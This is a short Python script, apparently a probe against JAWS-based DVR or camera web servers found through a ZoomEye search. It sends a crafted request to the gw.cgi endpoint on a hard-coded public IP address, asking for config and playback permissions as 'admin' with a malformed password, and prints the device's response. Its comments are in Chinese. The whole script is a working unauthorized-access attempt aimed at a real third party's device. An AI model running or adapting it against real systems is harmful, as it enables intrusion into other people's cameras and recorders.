import requests
import requests.packages.urllib3.util.ssl_
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'ALL'


# url ="https://www.zoomeye.org/vision/search?q=JAWS"
# url ="http://99.119.255.246/index.html"
url ="http://99.119.255.246/cgi-bin/gw.cgi?" \
     "xml=%3Cjuan%20ver=%22%22%20squ=%22%22%20dir=%220%22%3E%3Crpermission%20usr=%22admin%22%20" \
     "pwd=%1505138836023%22%3E%3Cconfig%20base=%22%22/%3E%3Cplayback%20base=%22%22/%3E%3C/rpermission%3E%3C/juan%3E&_=1505138836023"


# 爬取结果
response = requests.get(url)

# 打印结果
print(response.content)

